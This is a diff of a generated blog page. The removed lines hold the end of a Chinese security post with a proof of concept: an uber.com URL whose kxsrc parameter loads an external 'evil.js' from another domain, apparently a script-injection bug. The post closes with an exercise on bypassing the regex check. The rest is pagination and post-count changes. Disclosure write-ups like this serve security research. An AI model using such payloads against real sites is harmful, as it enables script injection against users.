-<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg" alt=""></p>
-<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//www</span>.uber.com/?<span class="keyword">exp</span>=hp-c&amp;kxsrc=https<span class="variable">%3A</span><span class="variable">%2F</span><span class="variable">%2Fwww</span>.akrxd.net<span class="variable">%2Fcontroltag</span><span class="variable">%2Fevil</span>.js</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif" alt=""></p>
-<p>思考题: 写这段正则判断代码的人应该还希望限制路径，但其实很容易就可以被绕过，怎么绕呢？</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -525,7 +561,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">18</span>
+              <span class="site-state-item-count">19</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
